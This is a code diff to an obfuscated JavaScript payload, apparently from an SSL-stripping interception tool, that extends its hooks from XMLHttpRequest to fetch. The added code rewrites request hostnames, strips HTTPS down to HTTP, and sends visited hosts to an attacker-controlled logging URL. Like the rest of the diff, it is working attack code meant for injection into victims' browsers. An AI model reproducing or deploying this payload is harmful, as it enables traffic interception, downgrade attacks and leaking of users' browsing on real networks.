@@ -1,5 +1,5 @@
 /*
-  Hooks XMLHttpRequest as well as 'a', 'form', 'script' and 'iframe' nodes.
+  Hooks XMLHttpRequest.open and fetch, as well as 'a', 'form', 'script' and 'iframe' nodes.
   This payload is essential for hostname replacements.
 
   Remember that any occurrence of 'obf_path_ssl_log', 'obf_path_callback' and
@@ -21,6 +21,7 @@
 
   var obf_func_open = XMLHttpRequest.prototype.open,
       obf_var_XMLHttpRequest = new XMLHttpRequest(),
+      obf_func_fetch = globalThis.fetch,
       obf_var_callback_log = [];
 
   function obf_func_toWholeRegexpSet(obf_var_selector_string, obf_var_replacement_string) {
@@ -88,12 +89,7 @@
       }
     }
     obf_var_callback_log.push(obf_var_host);
-    var obf_var_req = obf_var_XMLHttpRequest;
-    obf_var_req.open(
-      "GET",
-      "http://obf_random_host/obf_path_ssl_log?" + obf_var_host,
-      true);
-    obf_var_req.send();
+    obf_func_fetch("http://obf_random_host/obf_path_ssl_log?" + obf_var_host)
   }
 
   function obf_func_hijack(obf_var_host) {
@@ -140,6 +136,28 @@
         obf_var_parsed_url[4] +
         obf_var_parsed_url[5];
       return obf_func_open.apply(this, arguments);
+    }
+  }
+
+  function obf_func_hook_fetch() {
+    globalThis.fetch = function(obf_var_resource, obf_var_options) {
+      var obf_var_parsed_url = obf_func_parseURL(obf_var_resource),
+          obf_var_hijacked_host = obf_func_hijack(obf_var_parsed_url[1]);
+      if (obf_var_hijacked_host != obf_var_parsed_url[1]) {
+        if (obf_var_parsed_url[0].toLowerCase() === "https://") {
+          obf_var_parsed_url[0] = obf_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
+        }
+        if (obf_var_parsed_url[2] === ":443") {
+          obf_var_parsed_url[2] = "";
+        }
+      }
+      obf_var_resource = obf_var_parsed_url[0] +
+        obf_var_hijacked_host +
+        obf_var_parsed_url[2] +
+        obf_var_parsed_url[3] +
+        obf_var_parsed_url[4] +
+        obf_var_parsed_url[5];
+      return obf_func_fetch(obf_var_resource, obf_var_options);
     }
   }
 
@@ -213,9 +231,13 @@
       } catch(obf_var_ignore) {}
     });
   }
-  
+
   try {
     obf_func_hook_XMLHttpRequest();
+  } catch(obf_var_ignore) {}
+
+  try {
+    obf_func_hook_fetch();
   } catch(obf_var_ignore) {}
 
   globalThis.addEventListener("DOMContentLoaded", function(){
